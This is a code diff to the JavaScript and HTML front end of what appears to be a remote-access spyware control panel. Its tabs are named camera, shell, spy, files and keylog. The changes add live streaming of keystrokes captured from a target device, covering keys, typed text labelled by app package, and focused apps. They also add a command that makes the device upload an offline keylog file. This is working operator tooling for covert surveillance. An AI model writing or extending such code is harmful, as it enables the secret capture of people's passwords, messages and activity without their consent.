@@ -390,11 +390,12 @@ audio{width:100%;display:none}
         <!-- Keylog -->
         <div id="tab-keylog" class="tab-panel">
           <div class="kl-ctrl">
-            <button onclick="fetchKeylog()">&#8635; Refresh</button>
+            <button id="btnKlLive" onclick="toggleKlLive()">&#9654; Live</button>
+            <button onclick="fetchKeylog()">&#8635; History</button>
             <button onclick="clearKeylog()">&#128465; Clear</button>
-            <label><input type="checkbox" id="klAuto" onchange="setKlAuto(this.checked)"> Auto-refresh 5s</label>
+            <button onclick="fetchKlogFile()" title="Upload offline log file from device">&#11014; Offline File</button>
           </div>
-          <div id="keylogArea">— no keystrokes captured yet —</div>
+          <div id="keylogArea">— waiting for keystrokes —</div>
         </div>
 
       </div>
@@ -739,31 +740,72 @@ async function fetchKeylog() {
   const entries = data.entries || [];
   const box = document.getElementById('keylogArea');
   if (!entries.length) { box.textContent = '— no keystrokes captured yet —'; return; }
-  box.innerHTML = entries.map(e => {
-    const t = e.type || 'key';
-    const ts = e.srv_ts || '--:--:--';
-    const cls = t === 'key' ? 'kl-key' : t === 'text' ? 'kl-text' : 'kl-focus';
-    const label = t === 'focus' ? 'APP' : t.toUpperCase();
-    const data2 = t === 'text' ? `[${e.pkg || '?'}] ${e.data}` : t === 'focus' ? `${e.pkg}/${e.data}` : e.data;
-    return `<div class="kl-entry">
-      <span class="kl-ts">${ts}</span>
-      <span class="kl-type ${cls}">${label}</span>
-      <span class="kl-data">${esc(data2 || '')}</span>
-    </div>`;
-  }).join('');
-  box.scrollTop = box.scrollHeight;
+  box.innerHTML = '';
+  appendKeylogEntries([...entries].reverse()); // oldest first
 }
 
 async function clearKeylog() {
   await apiFetch(`/api/devices/${did}/keylog/clear`, {method:'POST'});
-  document.getElementById('keylogArea').textContent = '— cleared —';
+  document.getElementById('keylogArea').innerHTML = '— cleared —';
   toast('Keylog cleared');
 }
 
-let _klAutoTimer = null;
-function setKlAuto(on) {
-  if (_klAutoTimer) { clearInterval(_klAutoTimer); _klAutoTimer = null; }
-  if (on) { _klAutoTimer = setInterval(fetchKeylog, 5000); fetchKeylog(); }
+let _klEs = null;
+function toggleKlLive() {
+  if (_klEs) { stopKlLive(); return; }
+  _klEs = new EventSource(`/api/devices/${did}/keylog-stream`);
+  _klEs.onmessage = e => {
+    try {
+      const batch = JSON.parse(e.data);
+      appendKeylogEntries(batch);
+    } catch(ex) {}
+  };
+  _klEs.onerror = () => stopKlLive();
+  const btn = document.getElementById('btnKlLive');
+  btn.textContent = '⏹ Stop Live';
+  btn.classList.add('active');
+  toast('Keylog live started');
+}
+function stopKlLive() {
+  if (_klEs) { _klEs.close(); _klEs = null; }
+  const btn = document.getElementById('btnKlLive');
+  btn.textContent = '▶ Live';
+  btn.classList.remove('active');
+}
+
+function appendKeylogEntries(entries) {
+  const box = document.getElementById('keylogArea');
+  if (box.textContent.includes('waiting') || box.textContent.includes('cleared'))
+    box.innerHTML = '';
+  const atBottom = box.scrollTop + box.clientHeight >= box.scrollHeight - 30;
+  for (const e of entries) {
+    const t = e.type || 'key';
+    const ts = e.srv_ts || '--:--:--';
+    const cls = t === 'key' ? 'kl-key' : t === 'text' ? 'kl-text' : 'kl-focus';
+    const label = t === 'focus' ? 'APP' : t.toUpperCase();
+    const d2 = t === 'text' ? `[${e.pkg||'?'}] ${e.data}` : t === 'focus' ? `${e.pkg}/${e.data}` : e.data;
+    const row = document.createElement('div');
+    row.className = 'kl-entry';
+    row.innerHTML = `<span class="kl-ts">${ts}</span><span class="kl-type ${cls}">${label}</span><span class="kl-data">${esc(d2||'')}</span>`;
+    box.appendChild(row);
+  }
+  if (atBottom) box.scrollTop = box.scrollHeight;
+}
+
+async function fetchKlogFile() {
+  await sendCmd('__keylog_file__');
+  toast('Offline log upload requested — check Files tab');
+  setTimeout(() => { switchTabDirect('files'); loadFileList(); }, 3000);
+}
+
+function switchTabDirect(name) {
+  document.querySelectorAll('.tab-panel').forEach(p => p.classList.remove('active'));
+  document.querySelectorAll('.tab-btn').forEach(b => b.classList.remove('active'));
+  document.getElementById('tab-' + name).classList.add('active');
+  const btns = document.querySelectorAll('.tab-btn');
+  const names = ['camera','shell','spy','files','keylog'];
+  const idx = names.indexOf(name);
+  if (idx >= 0) btns[idx].classList.add('active');
 }
 
 // ── Tabs ─────────────────────────────────────────────────────────────────────
